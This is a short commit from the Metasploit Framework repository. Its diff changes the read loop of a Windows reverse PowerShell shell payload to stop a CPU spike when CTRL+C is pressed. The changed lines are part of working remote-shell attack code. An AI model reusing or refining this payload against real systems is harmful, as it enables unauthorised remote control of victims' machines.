e4b4264d790be70d2c790a7a9aa0e6f32f453d44
OJ <oj@buffered.io>
2016-11-02 05:19:52 +1000

    Fix psh template to avoid 100% cpu spike on CTRL+C
    Fixes #7293

--- modules/payloads/singles/cmd/windows/reverse_powershell.rb
+++ modules/payloads/singles/cmd/windows/reverse_powershell.rb
@@ -81,7 +81,8 @@ module MetasploitModule
           "while (($i -gt 0) -and ($pos -lt $nb.Length)) {"\
             "$r=$s.Read($nb,$pos,$nb.Length - $pos);"\
             "$pos+=$r;"\
-            "if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}};"\
+            "if (-not $pos -or $pos -eq 0) {RSC};"\
+            "if ($nb[0..$($pos-1)] -contains 10) {break}};"\
             "if ($pos -gt 0){"\
               "$str=$e.GetString($nb,0,$pos);"\
               "$is.write($str);start-sleep 1;"\
